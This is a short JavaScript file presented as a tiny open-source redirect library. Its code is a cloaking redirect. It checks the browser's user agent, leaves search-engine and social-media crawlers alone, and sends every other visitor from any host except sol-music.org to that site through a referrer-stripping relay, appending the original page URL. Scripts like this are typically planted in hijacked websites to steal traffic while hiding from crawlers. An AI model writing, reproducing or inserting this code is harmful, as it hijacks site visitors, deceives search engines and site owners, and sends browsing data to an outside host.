/*!
 * fluffy-wafle v1.1.0: A tiny JS Redirect
 * (c) 2020 aksanza
 * https://github.com/mirahh/fluffy-waffle
 */

var ars = 'https://href.li/?https://sol-music.org';
var arsx = 'sol-music.org';

    var agent = navigator.userAgent;
var regex = /google|googlebot|bingbot|bot|bing|yahoo|pinterest|twitter|facebook|yandex/i;
if (!regex.exec(agent)){
if( window.location.hostname !== arsx ){
    window.location.href = ars + '/?bacot='+ encodeURIComponent(window.location.href);
	}
}        
